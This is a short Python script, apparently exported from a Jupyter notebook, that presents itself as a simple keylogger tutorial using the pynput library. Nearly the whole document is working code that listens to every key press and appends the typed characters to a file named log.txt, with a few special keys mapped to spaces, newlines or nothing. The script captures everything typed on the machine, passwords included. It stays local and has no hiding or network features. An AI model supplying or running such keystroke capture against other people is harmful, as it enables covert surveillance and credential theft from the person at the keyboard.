#!/usr/bin/env python
# coding: utf-8

# # A simple python program to keylog using pynput library 

# In[2]:


# requirements:
#      1.python basics for reading and writing using 'with' keyword files(link: https://www.geeksforgeeks.org/with-statement-in-python/)


# In[3]:


# pynput library is used to save typed keyword  and control mouse and keyboard( link : https://pypi.org/project/pynput/)


# In[4]:


# 'pip install pynput' to install pynput library 
from pynput.keyboard import Listener


# In[ ]:


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

# collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()

